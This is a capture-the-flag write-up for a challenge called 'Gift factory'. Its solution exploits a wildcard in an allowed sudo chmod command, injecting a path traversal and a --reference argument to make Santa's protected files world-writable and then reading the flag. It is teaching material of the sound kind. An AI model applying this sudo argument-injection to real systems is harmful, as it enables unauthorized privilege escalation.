# Gift factory

**Author:** [KptCheeseWhiz](https://github.com/KptCheeseWhiz)

## Description 

Krampus contacted you and he is willing to pay big bucks to have santa's good list in advance. As an elf working minimum wage at a gift factory, it would be nice if you could pay for both your rent and food this month.

`ssh -p41337 h0h0h0@h0h0h0.monordibogue.com #password is h0h0h0`

## Solution
The command you are allowed to run as root contains a '*'. You can inject additional paths and parameters to change its behavior completly.

```bash
# Create a file named u+rwx to fulfill the first argument
touch u+rwx

# Set its permissions to 777
chmod 777 u+rwx

# And use it as reference, effectively setting the permissions of the other files to 777
sudo /bin/chmod u+rwx /home/elf/wrapped/../u+rwx --reference=u+rwx /home/santa/naughty.txt /home/santa/good.txt

# Print the flag
cat /home/santa/good.txt
```
